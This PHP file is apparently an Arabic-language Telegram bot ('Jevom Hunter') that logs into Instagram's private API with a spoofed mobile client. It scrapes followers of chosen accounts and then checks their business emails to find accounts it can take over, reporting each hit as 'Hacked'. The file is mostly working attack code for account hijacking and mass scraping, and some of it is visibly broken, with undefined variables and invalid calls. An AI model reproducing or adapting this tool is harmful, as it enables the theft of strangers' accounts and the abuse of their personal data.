<?php
include 'login.php';
include 'contents.php';
	      
class ig {
	private $url = 'https://i.instagram.com/api/v1';
	private $account;
	private $ret = [];
	private $file;
	public function __construct($settings){
		$this->account = $settings['account'];
		$this->account['useragent'] = 'Instagram 27.0.0.7.97 Android (23/6.0.1; 640dpi; 1440x2392; LGE/lge; RS988; h1; h1; en_US)';
		$this->file = $settings['file'];
		
	}
	public function login($user,$pass){
		$uuid = $this->UUID();
		$guid = $this->GUID();
		return $this->request('accounts/login/',
			0,
			1,
			[
				'signed_body'=>'57afc5aa6cc94675a08329beaffaec7bad237df0198ed801280f459e80095abb.'.json_encode([
					'phone_id'=>$guid,
					'username'=>$user,
					'_uid'=>'929294838399',
					'guid'=>$guid,
					'_uuid'=>$guid,
					'device_id'=>'android-'.$guid,
					'password'=>$pass,
					'login_attempt_count'=>'0',
				])
			],
			1
		);
	}
	public function news(){
		return $this->request('news/inbox/',1);
	}
	
	public function getComments($mediaId){
    return $this->request("media/{$mediaId}/comments/",1,0,['can_support_threading'=>true]);
  }
  public function getLikers($mediaId){
	  return $this->request("media/{$mediaId}/likers/",1);
	}
	public function getPosts($userId){
		return $this->request("feed/user/{$userId}/",1);
	}
	public function getInfo($username){
		return $this->request("users/{$username}/usernameinfo/",1)->user;
	}
	public function comment($mediaId,$comment){
		$uuid = $this->UUID();
		$guid = $this->GUID();
		return $this->request("media/{$mediaId}/comment/",1,1,[
						'user_breadcrumb'=>$this->generateUserBreadcrumb(mb_strlen($comment)),
            'idempotence_token'=>$uuid,
            '_uuid'=>$uuid,
            '_uid'=>rand(1000000000,9999999999),
            'comment_text'=>$comment,
            'containermodule'=>'comments_feed_timeline',
            'radio_type'=>'wifi-none'
		]);
	}
	public function like($mediaId){
		$uuid = $this->UUID();
		$guid = $this->GUID();
    return $this->request("media/{$mediaId}/like/",1,1,[
        '_uuid'=>$uuid,
        '_uid'=>rand(1000000000,9999999999),
        'media_id'=>$mediaId,
        'radio_type'=>'wifi-none',
        'module_name'=>'feed_timeline'
    ]);
  }
	public function unfollow($id){
		$uuid = $this->UUID();
		$guid = $this->GUID();
		return $this->request("friendships/destroy/$id/",1,1,[
					'_uid'=>rand(1000000000,9999999999),
					'_uuid'=>$guid,
					'user_id'=>$id,
					'radio_type'=>'wifi-none'
		]);
	}
	public function follow($id){
		$uuid = $this->UUID();
		$guid = $this->GUID();
		return $this->request("friendships/create/$id/",1,1,[
					'_uid'=>rand(1000000000,9999999999),
					'_uuid'=>$guid,
					'user_id'=>$id,
					'radio_type'=>'wifi-none'
		]);
	}
	public function getFollowing($id,$mid,$uuu,$maxId = null){
	        $config = json_decode(file_get_contents('config.json'),1);
	    $from = 'Following';
		$file = $this->file;
		$rank_token = $this->UUID();
		$datas['rank_token'] = $rank_token;
		if($maxId != null){
		 $datas['max_id'] = $maxId;
		}
		$res = $this->request("friendships/$id/following/",1,0,$datas,0);
		if(isset($res->users)){
			$in = explode("\n",file_get_contents($file));
			foreach($res->users as $user){
				if(!in_array($user->username, $in)){
					$users[] = $user->username;
					file_put_contents($file, $user->username."\n",FILE_APPEND);
				}
				}

		}

		if($res->next_max_id != null){
			$this->getFollowing($id,$mid,$uuu,$res->next_max_id);
		} 

	}
	
	
	public function getFollowers($id,$mid,$uuu,$maxId = null){

	    $from = 'Followers';
		$file = $this->file;
		$rank_token = $this->UUID();
		$datas['rank_token'] = $rank_token;
		if($maxId != null){
			$datas['max_id'] = $maxId;
		}
		$res = $this->request("friendships/$id/followers/",1,0,$datas,0);
		if(isset($res->users)){
			$in = explode("\n",file_get_contents($file));
			foreach($res->users as $user){
				if(!in_array($user->username, $in)){
					$users[] = $user->username;
					file_put_contents($file, $user->username."\n",FILE_APPEND);
				}
				}

		}
		if($res->next_max_id != null){
			$this->getFollowers($id,$mid,$uuu,$res->next_max_id);
		}




	}

	public function generateUserBreadcrumb($size){
      $key = 'iN4$aGr0m';
      $date = (int) (microtime(true) * 1000);
      $term = rand(2, 3) * 1000 + $size * rand(15, 20) * 100;
      $text_change_event_count = round($size / rand(2, 3));
      if ($text_change_event_count == 0) {
          $text_change_event_count = 1;
      }
      $data = $size.' '.$term.' '.$text_change_event_count.' '.$date;
      return base64_encode(hash_hmac('sha256', $data, $key, true))."\n".base64_encode($data)."\n";
  }
	private function GUID(){
    if (function_exists('com_create_guid') === true){
        return trim(com_create_guid(), '{}');
    }

    return sprintf('%04X%04X-%04X-%04X-%04X-%04X%04X%04X', mt_rand(0, 65535), mt_rand(0, 65535), mt_rand(0, 65535), mt_rand(16384, 20479), mt_rand(32768, 49151), mt_rand(0, 65535), mt_rand(0, 65535), mt_rand(0, 65535));
	}
	private function UUID(){
    $uuid = sprintf(
        '%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0x0fff) | 0x4000,
        mt_rand(0, 0x3fff) | 0x8000,
        mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0xffff)
    );
    
    return $uuid;
	}
	private function request($path,$account = 0,$post = 0,$datas = 0,$returnHeaders = 0){
		$ch = curl_init(); 
	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	  if($post == 1){
	  	curl_setopt($ch, CURLOPT_POST, 1);
	  }
	  if($datas != 0 and $post == 1){
		  curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($datas));
		  curl_setopt($ch, CURLOPT_URL, $this->url .'/'. $path); 
	  } elseif($datas != 0 and $post == 0){
	  	curl_setopt($ch, CURLOPT_URL, $this->url .'/'. $path.'?'.http_build_query($datas)); 
	  } else {
	  	curl_setopt($ch, CURLOPT_URL, $this->url .'/'. $path); 
	  }
	  if($account == 0){
	  	curl_setopt($ch, CURLOPT_HTTPHEADER, array(
		     'x-ig-capabilities: 3w==',
		     'user-agent: Instagram 27.0.0.7.97 Android (23/6.0.1; 640dpi; 1440x2392; LGE/lge; RS988; h1; h1; en_US)',
		     'host: i.instagram.com',
		     'X-CSRFToken: missing',
		     'X-Instagram-AJAX: 1',
		     'Content-Type: application/x-www-form-urlencoded',
		     'X-Requested-With: XMLHttpRequest',
		     "Cookie: mid=XUzLlQABAAH63ME45I6TG-i46cOi",
		     'Connection: keep-alive'
		  ));
	  } elseif($account == 1){
	  	curl_setopt($ch, CURLOPT_HTTPHEADER, array(
	      'x-ig-capabilities: 3w==',
	      'user-agent: '.$this->account['useragent'],
	      'host: i.instagram.com',
	      'X-CSRFToken: missing',
	      'X-Instagram-AJAX: 1',
	      'Content-Type: application/x-www-form-urlencoded',
	      'X-Requested-With: XMLHttpRequest',
	      "Cookie: ".$this->account['cookies'],
	      'Connection: keep-alive'
	  ));
	  }
	  if($returnHeaders == 1){
		  curl_setopt($ch, CURLOPT_HEADER, 1);
		  $res = curl_exec($ch);
		  $res = explode("\r\n\r\n", $res);
	  } else {
		  $res = curl_exec($ch);
		  $res = json_decode($res);
	  }
	  return $res;
	}
}
header('Content-Type: application/json');
error_reporting(0);
function tget($key,$key2){$json = json_decode(file_get_contents('data.json'));return $json->$key->$key2;}
    
echo "\n";
if (tget('bot','token')=='NULL'){
				
$token = (readline("~ Your Token: "));$json = json_decode(file_get_contents('data.json'));$json->bot->token = $token;file_put_contents('data.json',json_encode($json));
}	      
else{$token = tget('bot','token');}
function bot($method, $datas = [])
{

    global $token;
    if (function_exists('curl_init')) {
        $url = "https://api.telegram.org/bot" . $token . "/" . $method;
        $ch  = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
        $res = curl_exec($ch);
        if (curl_error($ch)) {
            var_dump(curl_error($ch));
        } else {
            return json_decode($res, true);
        }
    } else {
        $http = http_build_query($datas);
        $url    = "https://api.telegram.org/bot" . $token . "/" . $method . "?$http";
        $res = file_get_contents($url);
        return json_decode($res, true);
    }
}



error_reporting(0);
$userg = 'Instagram 27.0.0.7.97 Android (23/6.0.1; 640dpi; 1440x2392; LGE/lge; RS988; h1; h1; en_US';
function query($id,$txt){bot('answerCallbackQuery',['callback_query_id'=>$id,'text'=>$txt,'show_alert'=>true,]);}
function loginfalse(){$json = json_decode(file_get_contents('data.json'));$json->acc->loggin = 'NULL';$json->acc->Cookie = 'NULL';file_put_contents('data.json',json_encode($json));}
function logintrue($login,$cookie){$json = json_decode(file_get_contents('data.json'));$json->acc->loggin = $login;$json->acc->Cookie = $cookie;file_put_contents('data.json',json_encode($json));}
function callfalse(){$json = json_decode(file_get_contents('data.json'));$json->callback->login = 'False';$json->callback->flowing = 'False';$json->callback->flowrs = 'False';$json->callback->tag = "False";file_put_contents('data.json',json_encode($json));}
function calltrue($login,$flowrs,$flowing,$tag){$json = json_decode(file_get_contents('data.json'));$json->callback->login = $login;$json->callback->flowrs = $flowrs;$json->callback->flowing = $flowing;$json->callback->tag = $tag;file_put_contents('data.json',json_encode($json));}
function file1($r1){$json = json_decode(file_get_contents('data.json'));$json->file->file = $r1;file_put_contents('data.json',json_encode($json));}
function login1($chat_id,$id,$txt){callfalse();bot("editMessagetext",['chat_id'=>$chat_id,'message_id'=>$id,'text'=>$txt,'reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>'- إضافة حساب','callback_data'=>'add']],[['text'=>'- القائمة الرئسية','callback_data'=>'main']],]])]);}
function login2($chat_id,$id,$txt,$acc){callfalse();bot("editMessagetext",['chat_id'=>$chat_id,'message_id'=>$id,'text'=>$txt,'reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>'- إضافة حساب','callback_data'=>'add']],[['text'=>$acc,'callback_data'=>'ii'],['text'=>'- حدف ','callback_data'=>'del']],[['text'=>'- القائمة الرئسية','callback_data'=>'main']],]])]);}
function main2($chat_id,$id,$txt){callfalse();bot('editmessagetext',['chat_id'=>$chat_id,'message_id'=>$id,'text'=>$txt,'reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>'- تسجيل الدخول','callback_data'=>'login']],[['text'=>'- سحب اليوزرات ','callback_data'=>'Grabe'],['text'=>'- التحقق من الحساب','callback_data'=>'checkacc']],[['text'=>'- بدأ الفحص','callback_data'=>'start']],[['text'=>'- Jev0m','url'=>'https://t.me/Jev0mz']],]])]);}
function main($chat_id,$txt){callfalse();bot('sendmessage',['chat_id'=>$chat_id,'text'=>$txt,'reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>'- تسجيل الدخول','callback_data'=>'login']],[['text'=>'- سحب اليوزرات ','callback_data'=>'Grabe'],['text'=>'- التحقق من الحساب','callback_data'=>'checkacc']],[['text'=>'- بدأ الفحص','callback_data'=>'start']],[['text'=>'- Jev0m','url'=>'https://t.me/Jev0mz']],]])]);}
function get($key,$key2){$json = json_decode(file_get_contents('data.json'));return $json->$key->$key2;}
function rep($chat_id,$txt,$id){bot('sendMessage',['chat_id'=>$chat_id,'text'=>$txt,'reply_to_message_id'=>$id,]);}
function greb($chat_id,$id,$txt,$acc,$con){callfalse();bot("editMessageText",['chat_id'=>$chat_id,'message_id'=>$id,'text'=>$txt,'reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>'- سحب من المتابعين','callback_data'=>'flwrs']],[['text'=>'- معلوماتي','callback_data'=>'check']],[['text'=>'- لست جديدة','callback_data'=>'new'],['text'=>'- إضافة للست السابقة','callback_data'=>'old']],[['text'=>'- القائمة الرئسية','callback_data'=>'main']],[['text'=>'- Jev0m','url'=>'https://t.me/Jev0mz']],]])]);}
function getcookie(){$cookies = array();
$json = json_decode(file_get_contents('data.json'));
foreach ($json->acc->Cookie as $key => $val){$cookies[] = ($key.': '.$val.";");};return implode(" ",$cookies);}
function getUpdates($offset = 0, $limit = 100, $timeout = 0, $update = true)
{
    global $updates;
    $content = ['offset' => $offset, 'limit' => $limit, 'timeout' => $timeout];
    $updates = bot('getUpdates', $content);
    if ($update) {
        if (array_key_exists('result', $updates) && is_array($updates['result']) && count($updates['result']) >= 1) {
            $last_element_id = $updates['result'][count($updates['result']) - 1]['update_id'] + 1;
            $content = ['offset' => $last_element_id, 'limit' => '1', 'timeout' => $timeout];
            bot('getUpdates', $content);
        }
    }
    return $updates;
}
function run()
{
    $update_id = $update_id ?? 0;
    $num = (int)$update_id + 1;
    $UpdateServer = end(getUpdates($num)['result']);
    $update = $UpdateServer;
    return $update;
}
function GetMe()
{
    return bot('getMe');
}
while (true) {
    $update = run();
     if (isset($update)) {
       
        $bot = GetMe()->result;$botid = $bot->id;$botname = $bot->first_name;$botusername = $bot->username;$message       = $update['message'];$message_id    = $message['message_id'];$chat_id       = $message['chat']['id'];$from_id       = $message['from']['id'];$first_name    = $message['from']['first_name'];$first_name    = $message['from']['username'];$type          = $message['chat']['type'];$text          = $message['text'];$ttt = "- By: @Div0mbot && @Jev0mz";	$data 	       = $update['callback_query']['data'];$call_id       = $update['callback_query']['message']['chat']['id'];$call_text       = $update['callback_query']['message']['text'];$call_msg_id       = $update['callback_query']['message']['message_id'];$query_id       = $update['callback_query']['id'];

}
	if ($newh){bot('SendMessage',['chat_id'=>$chat_id,'text'=>'- عذرا لايمكنك إستخدام البوت حتا تشترك في قناة البوت','reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>'- أضغط هنا لدهاب للقناة','url'=>'https://t.me/Jev0mZ']]]])]);}
		#if ($text=='/start'){main($chat_id,$ttt);}        
		if($text == '/start'){
			$bot->sendphoto([ 'chat_id'=>$chatId,$ttt,
				'photo'=>"https://t.me/llop12b/3",
				 'caption'=>'𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐉𝐄𝐕𝐎𝐌 𝐇𝐔𝐍𝐓𝐄𝐑 𝐅𝐑𝐄𝐄 𝐁𝐎𝐓  🥀 ']);
	if (get('callback','login') === 'True'){
		if (!empty($text)){ 
			if (strpos($text,':')!==false){
			$msg = explode(':',$text);
			$res = login($msg[0],$msg[1]);
			if ($res!== 'False'){
	  			logintrue($text,$res);
				login2($call_id,$call_msg_id,$ttt,get('acc','loggin'));
				rep($chat_id,'- تم تسجيل الدخول با نجاح',$message_id);}
			else{rep($chat_id,'- فشل التسجيل ، تأكد من معلوماتك',$message_id);}}
			else{rep($chat_id,'- نمط الإرسال خطأ',$message_id);}}}
	if (get('callback','flowrs') == 'True'){
	if (!empty($text)){
	$arr = ['cookies'=>get('acc','Cookie'),'useragent'=>'Instagram27.0.0.7.97 Android (23/6.0.1; 640dpi; 1440x2392; LGE/lge; RS988; h1; h1; en_US)',];
	$ids = explode(' ',$text);
	$file = 'user.txt';
	rep($chat_id,'- يتم السحب …',$message_id);
	foreach($ids as $user){
	        sleep(2);
	        $ig = new ig(['account'=>$arr,'file'=>$file]);
	        $info = $ig->getInfo($user);
	        $id = $info->pk;
	        $ig->getFollowers($id,'Z',$user);}
	$ry = count(explode("\n",file_get_contents('user.txt')));
	greb($call_id,$call_msg_id,$ttt,get('acc','loggin'),count(explode("\n",file_get_contents('user.txt'))));
	rep($chat_id,'- إنتهى / تم سحب :'.$ry,$message_id);}}
	switch ($data){
		case 'login':
			if (get('acc','loggin') == 'NULL' || get('acc','loggin') == null ){login1($call_id,$call_msg_id,'- Tool Grabber User && Email');}else{login2($call_id,$call_msg_id,$ttt,get('acc','loggin'));}
 			break;
		case 'add':
			query($query_id,' - أرسل المعلومات با هدا النمط: user:pass');
			calltrue('True','False','False','False');
			break;
		case 'del':
			logintrue('NULL','NULL');
			if (get('acc','loggin') == 'NULL' || get('acc','loggin') == null ){login1($call_id,$call_msg_id,'- Tool Grabber User && Email');}else{login2($call_id,$call_msg_id,$ttt,get('acc','loggin'));}
			break;
		case 'Grabe':
			if (get('acc','loggin')=='NULL'){query($query_id,'- عليك تسجيل الدخول أولا');}
			else{greb($call_id,$call_msg_id,$ttt,get('acc','loggin'),count(explode("\n",file_get_contents('user.txt'))));}
			break;
		case 'new':
			file1('new');	      		          
			file_put_contents('user.txt',' ');
			query($query_id,'- تم التعين على لست جديدة');
			greb($call_id,$call_msg_id,$ttt,get('acc','loggin'),count(explode("\n",file_get_contents('user.txt'))));
			break;
		case 'old':
			file1('old');
			query($query_id,'- تم التعين على اللست السابقة');
			break;
		case 'tag':
			callfalse();
			calltrue('False','False','False','True');
			query($query_id,'- أرسل الهاشتاك بدون علامة (#)');
			break;
		case 'flwrs':
			callfalse();
			calltrue('False','True','False','False');
			query($query_id,'- أرسل اليوزر بدون علامة (@)');
			break;
		case 'flwng':
			callfalse();
			calltrue('False','False','True','False');
			query($query_id,'- أرسل اليوزر بدون علامة (@)');
			break;
		case 'main':
			main2($call_id,$call_msg_id,$ttt);
			break;
		case 'check':
			$login = explode(":",get('acc','loggin'));
			$login = login($login[0],$login[1]);
			if ($login == 'False'){
				$login = ' الحساب طالب سكيور.';$kk = 'False';}else{
				$login = 'شغال';$kk = 'True';}
			$ry = count(explode("\n",file_get_contents('user.txt')));
			query($query_id,'- تم سحب: '.$ry." يوزر.\n- حالة الحساب: ".$login);
			if ($kk == 'False'){
				logintrue('NULL','NULL');
				main2($call_id,$call_msg_id,$ttt);}
			else{continue;}
			break;
		case 'checkacc':
			$login = get('acc','loggin');
			if ($login == 'NULL'){
			query($query_id,'- عليك تسجيل الدخول أولا');
			}
			else{
				$login = explode(":",get('acc','loggin'));
	                        $login = login($login[0],$login[1]);
        	                if ($login == 'False'){
                                $login = ' الحساب طالب سكيور.';$kk = 'False';}else{
		                $login = 'شغال';$kk = 'True';}
				query($query_id,'- حالة الحساب:'.$login);
				if ($kk == 'False'){
					logintrue('NULL','NULL');				}			}
			break;
		case 'start':
			$fle = file_get_contents('user.txt');
			$ex = explode("\n",$fle);$a=0;
			$con = count($ex);
			$bs = 0;
			$notbs = 0;			$rest = 0;
			$notrest = 0;			$live = 0;
			$falid = 0;
			$true = 0;
			$false = 0;
			foreach ($ex as $user){
			$res = getinfo($user,get('acc','Cookie'),'Instagram 27.0.0.7.97 Android (23/6.0.1; 640dpi; 1440x2392; LGE/lge; RS988; h1; h1; en_US');
			if ($res !== false){
			$bs++;
			if (CheckMail($res["mail"]) !== false){
			$live++;
			if (rest($res['mail'])!== false){
			$rest++;
			$true++;
			bot('sendmessage',['chat_id'=>$call_id,'text'=>"- New Acounte HAcked By JEv0m✅ :\n 📡 - User: ".$res['user']."\n 📡 - Followers: ".$res["f"]."\n 📡 - Following: ".$res["ff"]."\n 📡 - Post: ".$res["m"]."\n 📡 - Email: ".$res["mail"]."\n CH: Jev0mZ    Dev:Div0mbot",]);}
			else{$notrest++;}}
			else{$falid++;}
			}elseif($res === false){$notbs++;}
			else{query($query_id,'- الحساب طالب سكيور');break;}
			$a++;
			bot('editmessagetext',['chat_id'=>$call_id,'message_id'=>$call_msg_id,'text'=>$ttt,'reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>$con,'callback_data'=>'oo'],['text'=>'المجموع:','callback_data'=>'kekdjd']],[['text'=>$a,'callback_data'=>'ksksj'],['text'=>'-تم فحصها','callback_data'=>'kskdk']],[['text'=>' ','callback_data'=>'jsodn']],[['text'=>$notbs,'callback_data'=>'jssj'],['text'=>'- غير ','callback_data'=>'kwkj'],['text'=>$bs,'callback_data'=>'kwkdom'],['text'=>'- بزنس ','callback_data'=>'osoddk']],[['text'=>$falid,'callback_data'=>'jjssj'],['text'=>'- غير','callback_data'=>'kwkjks'],['text'=>$live,'callback_data'=>'kwksdom'],['text'=>'- متاح','callback_data'=>'osojddk']],[['text'=>$notrest,'callback_data'=>'jjnssj'],['text'=>'- غير ','callback_data'=>'kwdkjks'],['text'=>$rest,'callback_data'=>'kwksddom'],['text'=>'- مربوط','callback_data'=>'fosojddk']],[['text'=>' ','callback_data'=>'jksodn']],[['text'=>$true,'callback_data'=>'kweksddom'],['text'=>'- تم الصيد ','callback_data'=>'fjosojddk']],[['text'=>'- Jev0m ','url'=>'https://t.me/Jev0mz']],]])]);};break;

	}
}

